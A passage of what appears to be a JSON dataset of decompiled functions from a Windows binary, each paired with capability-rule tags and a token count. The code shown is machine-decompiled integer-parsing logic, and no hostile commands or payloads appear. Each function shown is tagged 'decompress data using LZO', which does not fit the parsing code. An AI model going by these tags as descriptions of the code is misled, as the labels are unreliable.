arg_8h[3]) {\n                    uVar16 = *arg_8h[2];\n                }\n                else {\n                    uVar16 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar16 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            cVar5 = *(iVar8 + 0x10);\n        } while (bVar19);\n        var_48h._2_1_ = 0;\n    }\ncode_r0x004507e9:\n    var_50h = 0x16;\n    if (uVar18 != 0x10) {\ncode_r0x004507f5:\n        var_50h = uVar18;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (cVar5 != '\\0') {\ncode_r0x00450f20:\n        stack0xffffffcc = &var_28h;\n        var_2ch = 0;\n        fcn.004924e0(0x20);\n    }\n    uVar17 = var_48h._2_1_;\n    var_68h = &var_28h;\n    uVar20 = fcn.00418980(0xffffffff, 0xffffffff, uVar18, 0);\n    uVar9 = uVar20 >> 0x20;\n    uVar1 = *(iVar8 + 0xa4);\n    if (uVar1 == 0) {\n        if (var_48h._2_1_ == 0) {\n            var_48h._1_1_ = 0;\n            var_40h = 0;\n            var_3ch = 0;\ncode_r0x00450878:\n            uVar15 = uVar16;\n            uVar16 = uVar16 & 0xffff;\n            if (var_50h < 0xb) {\n                if ((uVar15 < 0x30) || (var_50h + 0x30U <= uVar15)) goto code_r0x00450ad0;\n            }\n            else if (9 < uVar15 - 0x30) goto code_r0x00450aad;\n            uVar16 = uVar16 - 0x30;\ncode_r0x0045089c:\n            if (uVar16 != 0xffffffff) {\n                do {\n                    if (uVar9 < var_3ch || uVar9 - var_3ch < (uVar20 < var_40h)) {\n                        var_48h._1_1_ = 1;\n                        uVar16 = arg_8h[2];\n                        if (arg_8h[3] <= uVar16) goto code_r0x00450b73;\ncode_r0x00450907:\n                        arg_8h[2] = uVar16 + 2;\ncode_r0x00450916:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        bVar3 = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            bVar3 = true;\n                        }\n                    }\n                    else {\n                        uVar10 = var_40h * uVar18;\n                        uVar14 = (var_40h * uVar18 >> 0x20) + uVar18 * var_3ch;\n                        uVar13 = ~(uVar16 >> 0x1f);\n                        var_48h._1_1_ = var_48h._1_1_ | (uVar13 < uVar14 || uVar13 - uVar14 < (~uVar16 < uVar10));\n                        var_40h = uVar16 + uVar10;\n                        var_3ch = (uVar16 >> 0x1f) + uVar14 + CARRY4(uVar16, uVar10);\n                        uVar16 = arg_8h[2];\n                        var_44h = var_44h + 1;\n                        if (uVar16 < arg_8h[3]) goto code_r0x00450907;\ncode_r0x00450b73:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00450916;\n                        bVar3 = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar4 = arg_10h != NULL && arg_14h == -1;\n                    bVar6 = arg_14h == -1;\n                    if (bVar4) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar6 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar6 = bVar4;\n                        }\n                    }\n                    if (bVar3 == bVar6) {\n                        uVar1 = 1;\n                        goto code_r0x0045095c;\n                    }\n                    uVar16 = 0xffff;\n                    if (arg_8h == NULL) goto code_r0x00450878;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar16 = *arg_8h[2];\n                    }\n                    else {\n                        uVar16 = (**(*arg_8h + 0x24))();\n                    }\n                    uVar15 = uVar16;\n                    if (uVar15 != 0xffff) goto code_r0x00450878;\n                    arg_8h = NULL;\n                    if (var_50h < 0xb) break;\n                    uVar16 = 0xffff;\ncode_r0x00450aad:\n                    if (5 < uVar15 - 0x61) goto code_r0x00450c51;\n                    uVar16 = uVar16 - 0x57;\n                    if (uVar16 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x00450ad0;\n        }\n        var_48h._1_1_ = 0;\n        var_48h._2_1_ = 0;\n        var_40h = 0;\n        var_3ch = 0;\n        uVar1 = uVar17;\n    }\n    else {\n        if (var_48h._2_1_ == 0) {\n            var_48h._1_1_ = 0;\n            var_40h = 0;\n            var_3ch = 0;\n            do {\n                uVar10 = var_2ch;\n                iVar7 = uVar16;\n                if ((*(iVar8 + 0x10) == 0) || (*(iVar8 + 0x26) != iVar7)) {\n                    piVar11 = iVar8 + 0x78;\n                    uVar16 = var_50h;\n                    if (iVar7 == *(iVar8 + 0x24)) goto code_r0x00450ad0;\n                    while (*piVar11 != iVar7) {\n                        uVar16 = uVar16 - 1;\n                        piVar11 = piVar11 + 1;\n                        if (uVar16 == 0) {\n                            uVar1 = 0;\n                            goto code_r0x0045095c;\n                        }\n                    }\n                    iVar12 = piVar11 - (iVar8 + 0x78);\n                    uVar10 = iVar12 >> 1;\n                    uVar16 = uVar10 - 6;\n                    if (iVar12 < 0x1f) {\n                        uVar16 = uVar10;\n                    }\n                    if (var_3ch <= uVar9 && (uVar20 < var_40h) <= uVar9 - var_3ch) {\n                        uVar10 = var_40h * uVar18;\n                        uVar14 = var_3ch * uVar18 + (var_40h * uVar18 >> 0x20);\n                        uVar13 = ~(uVar16 >> 0x1f);\n                        var_48h._1_1_ = var_48h._1_1_ | (uVar13 < uVar14 || uVar13 - uVar14 < (~uVar16 < uVar10));\n                        var_40h = uVar16 + uVar10;\n                        var_3ch = (uVar16 >> 0x1f) + uVar14 + CARRY4(uVar16, uVar10);\n                        var_44h = var_44h + 1;\n                        goto code_r0x00450cfd;\n                    }\n                    uVar16 = arg_8h[2];\n                    var_48h._1_1_ = uVar1;\n                    if (arg_8h[3] <= uVar16) goto code_r0x00450dd9;\ncode_r0x00450d0c:\n                    arg_8h[2] = uVar16 + 2;\ncode_r0x00450d1b:\n                    if (arg_8h[2] < arg_8h[3]) {\n                        iVar7 = *arg_8h[2];\n                    }\n                    else {\n                        iVar7 = (**(*arg_8h + 0x24))();\n                    }\n                    uVar17 = 0;\n                    if (iVar7 == -1) {\n                        arg_8h = NULL;\n                        uVar17 = uVar1;\n                    }\n                }\n                else {\n                    if (var_44h == 0) {\n                        var_48h._2_1_ = *(iVar8 + 0x10);\n                        uVar1 = 0;\n                        goto code_r0x0045095c;\n                    }\n                    uVar16 = var_2ch + 1;\n                    uVar13 = 0xf;\n                    if (stack0xffffffcc != var_68h) {\n                        uVar13 = var_28h;\n                    }\n                    if (uVar13 < uVar16) {\n                        fcn.00492830(var_2ch, 0, 0, 1);\n                    }\n                    var_44h = 0;\n                    *(stack0xffffffcc + uVar10) = var_44h;\n                    *(stack0xffffffcc + uVar16) = 0;\n                    var_2ch = uVar16;\ncode_r0x00450cfd:\n                    uVar16 = arg_8h[2];\n                    if (uVar16 < arg_8h[3]) goto code_r0x00450d0c;\ncode_r0x00450dd9:\n                    (**(*arg_8h + 0x28))();\n                    uVar17 = uVar1;\n                    if (arg_8h != NULL) goto code_r0x00450d1b;\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                bVar6 = arg_10h != NULL && arg_14h == -1;\n                bVar3 = arg_14h == -1;\n                if (bVar6) {\n                    if (arg_10h[2] < arg_10h[3]) {\n                        iVar7 = *arg_10h[2];\n                    }\n                    else {\n                        iVar7 = (**(*arg_10h + 0x24))();\n                    }\n                    bVar3 = false;\n                    if (iVar7 == -1) {\n                        arg_10h = NULL;\n                        bVar3 = bVar6;\n                    }\n                }\n                if (bVar3 == uVar17) goto code_r0x0045095c;\n                uVar16 = 0xffff;\n                if (arg_8h != NULL) {\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar16 = *arg_8h[2];\n                    }\n                    else {\n                        uVar16 = (**(*arg_8h + 0x24))();\n                    }\n                    if (uVar16 == -1) {\n                        arg_8h = NULL;\n                    }\n                }\n            } while( true );\n        }\n        var_48h._1_1_ = 0;\n        var_40h = 0;\n        var_3ch = 0;\n        var_48h._2_1_ = 0;\n        uVar1 = uVar17;\n    }\ncode_r0x0045095c:\n    if (var_2ch != 0) goto code_r0x00450adf;\ncode_r0x00450964:\n    if ((var_44h != 0) || (bVar19)) {\ncode_r0x00450b23:\n        if (var_48h._2_1_ == 0) {\n            if (var_48h._1_1_ == 0) {\n                if (bVar2) {\n                    bVar19 = var_40h != 0;\n                    var_40h = -var_40h;\n                    var_3ch = -(var_3ch + bVar19);\n                }\n                *arg_20h = var_40h;\n                arg_20h[1] = var_3ch;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                arg_20h[1] = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00450992;\n        }\n    }\ncode_r0x00450979:\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x00450992:\n    if (uVar1 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != var_68h) {\n        fcn.004a34c0(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x00450c51:\n    if (5 < uVar15 - 0x41) goto code_r0x00450ad0;\n    uVar16 = uVar16 - 0x37;\n    goto code_r0x0045089c;\ncode_r0x00450ad0:\n    uVar1 = 0;\n    if (var_2ch == 0) goto code_r0x00450964;\ncode_r0x00450adf:\n    fcn.004929c0(var_44h);\n    cVar5 = fcn.0049e840(*(iVar8 + 8), *(iVar8 + 0xc), &var_31h + 1);\n    if (cVar5 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar19) || ((var_44h | var_2ch) != 0)) goto code_r0x00450b23;\n    goto code_r0x00450979;\n}\n",
        "token_count": 5560
    },
    "00451180": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00451180(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    bool bVar4;\n    char cVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint16_t *puVar10;\n    int32_t iVar11;\n    bool bVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    bool bVar16;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    uint8_t var_36h;\n    int32_t var_35h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar11 = arg_18h;\n    iVar8 = fcn.0042e500(arg_18h + 0x6c);\n    uVar14 = *(iVar11 + 0xc) & 0x4a;\n    if (uVar14 == 0x40) {\n        uVar15 = 8;\ncode_r0x004511bf:\n        var_35h._0_1_ = fcn.00430e20(&arg_10h);\n        if (var_35h == '\\0') {\ncode_r0x004511de:\n            var_40h = &arg_10h;\n            uVar6 = fcn.00430ec0();\n            bVar16 = *(iVar8 + 0x70) == uVar6;\n            cVar3 = *(iVar8 + 0x10);\n            if ((((bVar16) || (*(iVar8 + 0x72) == uVar6)) && ((cVar3 == '\\0' || (*(iVar8 + 0x26) != uVar6)))) &&\n               (*(iVar8 + 0x24) != uVar6)) {\n                fcn.004867f0();\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_35h._0_1_ = fcn.00430e20(var_40h);\n                stack0xffffffc8 = 0;\n                bVar2 = false;\n                if (var_35h == '\\0') {\n                    uVar6 = fcn.00430ec0();\n                    cVar3 = *(iVar8 + 0x10);\n                    goto code_r0x00451428;\n                }\n            }\n            else {\ncode_r0x00451428:\n                stack0xffffffc8 = 0;\n                bVar2 = false;\n                while (((cVar3 == '\\0' || (*(iVar8 + 0x26) != uVar6)) && (*(iVar8 + 0x24) != uVar6))) {\n                    if (*(iVar8 + 0x78) == uVar6) {\n                        bVar4 = uVar15 == 10 | bVar2 ^ 1U;\n                        if (!bVar4) goto code_r0x0045145f;\n                        bVar2 = uVar14 == 0 || uVar15 == 8;\n                        if (uVar14 != 0 && uVar15 != 8) {\n                            unique0x00007a80 = stack0xffffffc8 + 1;\n                            goto code_r0x00451495;\n                        }\n                        stack0xffffffc8 = 0;\n                        uVar15 = 8;\n                        uVar9 = arg_8h[2];\n                        if (arg_8h[3] <= uVar9) goto code_r0x00451550;\ncode_r0x004514a4:\n                        arg_8h[2] = uVar9 + 2;\ncode_r0x004514b3:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        var_35h._0_1_ = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            var_35h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar2) break;\ncode_r0x0045145f:\n                        if ((*(iVar8 + 0x74) != uVar6) && (*(iVar8 + 0x76) != uVar6)) {\n                            var_35h._0_1_ = '\\0';\n                            bVar2 = true;\n                            goto code_r0x00451260;\n                        }\n                        var_35h._0_1_ = uVar15 == 0x10 || uVar14 == 0;\n                        if (uVar15 != 0x10 && uVar14 != 0) {\n                            bVar2 = true;\n                            goto code_r0x0045126c;\n                        }\n                        stack0xffffffc8 = 0;\n                        uVar15 = 0x10;\n                        bVar4 = false;\ncode_r0x00451495:\n                        uVar9 = arg_8h[2];\n                        bVar2 = bVar4;\n                        if (uVar9 < arg_8h[3]) goto code_r0x004514a4;\ncode_r0x00451550:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x004514b3;\n                        var_35h._0_1_ = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar12 = arg_10h != NULL && arg_14h == -1;\n                    bVar4 = arg_14h == -1;\n                    if (bVar12) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar4 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar4 = bVar12;\n                        }\n                    }\n                    if (var_35h == bVar4) {\n                        var_35h._0_1_ = '\\x01';\n                        goto code_r0x00451260;\n                    }\n                    uVar6 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar6 = *arg_8h[2];\n                        }\n                        else {\n                            uVar6 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar6 == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    if (!bVar2) break;\n                    cVar3 = *(iVar8 + 0x10);\n                }\n                var_35h._0_1_ = '\\0';\n            }\ncode_r0x00451260:\n            var_44h = 0x16;\n            if (uVar15 == 0x10) goto code_r0x0045126f;\n        }\n        else {\n            uVar6 = 0;\n            stack0xffffffc8 = 0;\n            bVar2 = false;\n            bVar16 = false;\n        }\ncode_r0x0045126c:\n        var_44h = uVar15;\n    }\n    else {\n        if (uVar14 != 8) {\n            uVar15 = 10;\n            goto code_r0x004511bf;\n        }\n        uVar15 = 0x10;\n        var_35h._0_1_ = fcn.00430e20(&arg_10h);\n        if (var_35h == '\\0') goto code_r0x004511de;\n        uVar6 = 0;\n        stack0xffffffc8 = 0;\n        uVar15 = 0x10;\n        bVar2 = false;\n        bVar16 = false;\n        var_44h = 0x16;\n    }\ncode_r0x0045126f:\n    cVar3 = var_35h;\n    var_40h = &arg_10h;\n    *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n    if (*(iVar8 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    uVar14 = 0xffffffff / uVar15;\n    uVar1 = *(iVar8 + 0xa4);\n    if (uVar1 == 0) {\n        var_36h = 0;\n        if (var_35h == '\\0') {\n            var_3ch = 0;\n            do {\n                uVar9 = uVar6;\n                if (var_44h < 0xb) {\n                    if ((uVar6 < 0x30) || (var_44h + 0x30U <= uVar6)) goto code_r0x00451600;\ncode_r0x004512f6:\n                    uVar9 = uVar9 - 0x30;\n                }\n                else {\n                    if (uVar6 - 0x30 < 10) goto code_r0x004512f6;\n                    if (uVar6 - 0x61 < 6) {\n                        uVar9 = uVar9 - 0x57;\n                    }\n                    else {\n                        if (5 < uVar6 - 0x41) goto code_r0x00451600;\n                        uVar9 = uVar9 - 0x37;\n                    }\n                }\n                if (uVar9 == 0xffffffff) goto code_r0x00451600;\n                if (uVar14 < var_3ch) {\n                    var_36h = 1;\n                    uVar9 = arg_8h[2];\n                    if (arg_8h[3] <= uVar9) goto code_r0x004516a3;\ncode_r0x00451335:\n                    arg_8h[2] = uVar9 + 2;\n                }\n                else {\n                    var_36h = var_36h | ~uVar9 < var_3ch * uVar15;\n                    var_3ch = uVar9 + var_3ch * uVar15;\n                    unique0x00007a80 = stack0xffffffc8 + 1;\n                    uVar9 = arg_8h[2];\n                    if (uVar9 < arg_8h[3]) goto code_r0x00451335;\ncode_r0x004516a3:\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                cVar3 = fcn.00430e20(var_40h);\n                if (cVar3 != '\\0') goto code_r0x0045135f;\n                uVar6 = fcn.00430ec0();\n            } while( true );\n        }\n        var_3ch = 0;\n        var_35h._0_1_ = '\\0';\n    }\n    else if (var_35h == '\\0') {\n        var_36h = 0;\n        cVar5 = *(iVar8 + 0x10);\n        var_3ch = 0;\n        if (cVar5 == '\\0') goto code_r0x004517d0;\ncode_r0x00451758:\n        if (*(iVar8 + 0x26) != uVar6) goto code_r0x004517d0;\n        if (stack0xffffffc8 != 0) {\n            fcn.0046d560(stack0xffffffc8);\n            stack0xffffffc8 = 0;\ncode_r0x00451781:\n            uVar9 = arg_8h[2];\n            if (arg_8h[3] <= uVar9) goto code_r0x00451833;\n            do {\n                arg_8h[2] = uVar9 + 2;\n                while( true ) {\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    cVar3 = fcn.00430e20(var_40h);\n                    if (cVar3 != '\\0') goto code_r0x0045135f;\n                    uVar6 = fcn.00430ec0();\n                    cVar5 = *(iVar8 + 0x10);\n                    if (cVar5 != '\\0') goto code_r0x00451758;\ncode_r0x004517d0:\n                    puVar10 = iVar8 + 0x78;\n                    uVar9 = var_44h;\n                    if (uVar6 == *(iVar8 + 0x24)) goto code_r0x00451600;\n                    while (*puVar10 != uVar6) {\n                        uVar9 = uVar9 - 1;\n                        puVar10 = puVar10 + 1;\n                        if (uVar9 == 0) {\n                            cVar3 = '\\0';\n                            goto code_r0x0045135f;\n                        }\n                    }\n                    iVar11 = puVar10 - (iVar8 + 0x78);\n                    uVar9 = iVar11 >> 1;\n                    if (0x1e < iVar11) {\n                        uVar9 = uVar9 - 6;\n                    }\n                    if (var_3ch <= uVar14) {\n                        uVar13 = var_3ch * uVar15;\n                        var_3ch = uVar9 + uVar13;\n                        var_36h = var_36h | ~uVar9 < uVar13;\n                        unique0x00007a80 = stack0xffffffc8 + 1;\n                        goto code_r0x00451781;\n                    }\n                    uVar9 = arg_8h[2];\n                    var_36h = uVar1;\n                    if (uVar9 < arg_8h[3]) break;\ncode_r0x00451833:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\n        cVar3 = '\\0';\n        var_35h._0_1_ = cVar5;\n    }\n    else {\n        var_3ch = 0;\n        var_36h = 0;\n        var_35h._0_1_ = '\\0';\n    }\ncode_r0x0045135f:\n    cVar5 = cVar3;\n    if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00451610;\ncode_r0x0045136d:\n    if ((stack0xffffffc8 != 0) || (bVar2)) {\ncode_r0x0045165d:\n        if (var_35h == '\\0') {\n            if (var_36h == 0) {\n                uVar14 = -var_3ch;\n                if (!bVar16) {\n                    uVar14 = var_3ch;\n                }\n                *arg_20h = uVar14;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00451394;\n        }\n    }\n    goto code_r0x00451382;\ncode_r0x00451600:\n    cVar3 = '\\0';\n    cVar5 = '\\0';\n    if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x0045136d;\ncode_r0x00451610:\n    cVar3 = cVar5;\n    fcn.0046d560(var_35h._1_1_);\n    cVar5 = fcn.0049e880(*(iVar8 + 8), *(iVar8 + 0xc), &var_1eh + 2);\n    if (cVar5 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (((stack0xffffffc8 != 0) || (bVar2)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x0045165d;\ncode_r0x00451382:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00451394:\n    if (cVar3 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3774
    },
    "00451980": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00451980(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    char cVar4;\n    uint8_t uVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint16_t *puVar12;\n    int32_t iVar13;\n    bool bVar14;\n    bool bVar15;\n    uint32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    uint8_t var_36h;\n    int32_t var_35h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar10 = arg_18h;\n    iVar8 = fcn.0042e500(arg_18h + 0x6c);\n    uVar9 = *(iVar10 + 0xc) & 0x4a;\n    if (uVar9 == 0x40) {\n        var_5ch = 8;\ncode_r0x004519bf:\n        var_35h._0_1_ = fcn.00430e20(&arg_10h);\n        if (var_35h == 0) {\ncode_r0x004519de:\n            var_40h = &arg_10h;\n            uVar6 = fcn.00430ec0();\n            bVar15 = *(iVar8 + 0x70) == uVar6;\n            cVar4 = *(iVar8 + 0x10);\n            if ((((bVar15) || (*(iVar8 + 0x72) == uVar6)) && ((cVar4 == '\\0' || (*(iVar8 + 0x26) != uVar6)))) &&\n               (*(iVar8 + 0x24) != uVar6)) {\n                fcn.004867f0();\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_35h._0_1_ = fcn.00430e20(var_40h);\n                stack0xffffffc8 = 0;\n                bVar1 = false;\n                if (var_35h == 0) {\n                    uVar6 = fcn.00430ec0();\n                    cVar4 = *(iVar8 + 0x10);\n                    goto code_r0x00451be0;\n                }\n            }\n            else {\ncode_r0x00451be0:\n                stack0xffffffc8 = 0;\n                bVar1 = false;\n                while (((cVar4 == '\\0' || (*(iVar8 + 0x26) != uVar6)) && (*(iVar8 + 0x24) != uVar6))) {\n                    if (*(iVar8 + 0x78) == uVar6) {\n                        bVar3 = var_5ch == 10 | bVar1 ^ 1U;\n                        if (!bVar3) goto code_r0x00451c1c;\n                        bVar1 = uVar9 == 0 || var_5ch == 8;\n                        if (uVar9 != 0 && var_5ch != 8) {\n                            unique0x00007a80 = stack0xffffffc8 + 1;\n                            goto code_r0x00451c52;\n                        }\n                        stack0xffffffc8 = 0;\n                        var_5ch = 8;\n                        uVar11 = arg_8h[2];\n                        if (arg_8h[3] <= uVar11) goto code_r0x00451d90;\ncode_r0x00451c61:\n                        arg_8h[2] = uVar11 + 2;\ncode_r0x00451c70:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        var_35h._0_1_ = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            var_35h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar1) break;\ncode_r0x00451c1c:\n                        if ((*(iVar8 + 0x74) != uVar6) && (*(iVar8 + 0x76) != uVar6)) {\n                            var_35h._0_1_ = 0;\n                            bVar1 = true;\n                            goto code_r0x00451a51;\n                        }\n                        var_35h._0_1_ = var_5ch == 0x10 || uVar9 == 0;\n                        if (var_5ch != 0x10 && uVar9 != 0) {\n                            bVar1 = true;\n                            goto code_r0x00451a5d;\n                        }\n                        stack0xffffffc8 = 0;\n                        var_5ch = 0x10;\n                        bVar3 = false;\ncode_r0x00451c52:\n                        uVar11 = arg_8h[2];\n                        bVar1 = bVar3;\n                        if (uVar11 < arg_8h[3]) goto code_r0x00451c61;\ncode_r0x00451d90:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00451c70;\n                        var_35h._0_1_ = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar14 = arg_10h != NULL && arg_14h == -1;\n                    bVar3 = arg_14h == -1;\n                    if (bVar14) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar3 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar3 = bVar14;\n                        }\n                    }\n                    if (bVar3 == var_35h) {\n                        var_35h._0_1_ = 1;\n                        goto code_r0x00451a51;\n                    }\n                    uVar6 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar6 = *arg_8h[2];\n                        }\n                        else {\n                            uVar6 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar6 == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    if (!bVar1) break;\n                    cVar4 = *(iVar8 + 0x10);\n                }\n                var_35h._0_1_ = 0;\n            }\ncode_r0x00451a51:\n            var_44h = 0x16;\n            if (var_5ch != 0x10) goto code_r0x00451a5d;\n        }\n        else {\n            uVar6 = 0;\n            stack0xffffffc8 = 0;\n            bVar1 = false;\n            bVar15 = false;\ncode_r0x00451a5d:\n            var_44h = var_5ch;\n        }\n        *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n        if (*(iVar8 + 0x10) != '\\0') {\ncode_r0x00452100:\n            fcn.0046d280(0x20);\n        }\n        uVar2 = var_35h;\n        var_40h = &arg_10h;\n        var_4ch = bVar15 + 0x7fffffff;\n        var_50h = var_4ch / var_5ch;\n        var_36h = *(iVar8 + 0xa4);\n        if (var_36h == 0) {\n            if (var_35h == 0) {\n                var_36h = var_35h;\n                var_3ch = 0;\n                do {\n                    uVar9 = uVar6;\n                    if (var_44h < 0xb) {\n                        if ((uVar6 < 0x30) || (var_44h + 0x30U <= uVar6)) goto code_r0x00451e40;\ncode_r0x00451afa:\n                        iVar10 = uVar9 - 0x30;\n                    }\n                    else {\n                        if (uVar6 - 0x30 < 10) goto code_r0x00451afa;\n                        if (uVar6 - 0x61 < 6) {\n                            iVar10 = uVar9 - 0x57;\n                        }\n                        else {\n                            if (5 < uVar6 - 0x41) goto code_r0x00451e40;\n                            iVar10 = uVar9 - 0x37;\n                        }\n                    }\n                    if (iVar10 == -1) goto code_r0x00451e40;\n                    if (var_50h < var_3ch) {\n                        var_36h = 1;\n                        uVar9 = arg_8h[2];\n                        if (arg_8h[3] <= uVar9) goto code_r0x00451ee3;\ncode_r0x00451b3a:\n                        arg_8h[2] = uVar9 + 2;\n                    }\n                    else {\n                        var_36h = var_36h | var_4ch - iVar10 < var_3ch * var_5ch;\n                        var_3ch = iVar10 + var_3ch * var_5ch;\n                        unique0x00007a80 = stack0xffffffc8 + 1;\n                        uVar9 = arg_8h[2];\n                        if (uVar9 < arg_8h[3]) goto code_r0x00451b3a;\ncode_r0x00451ee3:\n                        (**(*arg_8h + 0x28))();\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    uVar2 = fcn.00430e20(var_40h);\n                    if (uVar2 != 0) goto code_r0x00451b64;\n                    uVar6 = fcn.00430ec0();\n                } while( true );\n            }\n            var_3ch = 0;\n            var_35h._0_1_ = 0;\n        }\n        else {\ncode_r0x00451fa1:\n            uVar2 = var_35h;\n            if (var_35h == 0) {\n                uVar5 = *(iVar8 + 0x10);\n                var_36h = 0;\n                var_3ch = 0;\n                if (uVar5 == 0) goto code_r0x00452040;\ncode_r0x00451fc1:\n                if (*(iVar8 + 0x26) != uVar6) goto code_r0x00452040;\n                if (stack0xffffffc8 != 0) {\n                    fcn.0046d560(stack0xffffffc8);\n                    stack0xffffffc8 = 0;\ncode_r0x00451fea:\n                    uVar9 = arg_8h[2];\n                    if (arg_8h[3] <= uVar9) goto code_r0x0045209f;\n                    do {\n                        arg_8h[2] = uVar9 + 2;\n                        while( true ) {\n                            var_40h = &arg_10h;\n                            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                            uVar2 = fcn.00430e20(var_40h);\n                            if (uVar2 != 0) goto code_r0x00451b64;\n                            uVar6 = fcn.00430ec0();\n                            uVar5 = *(iVar8 + 0x10);\n                            if (uVar5 != 0) goto 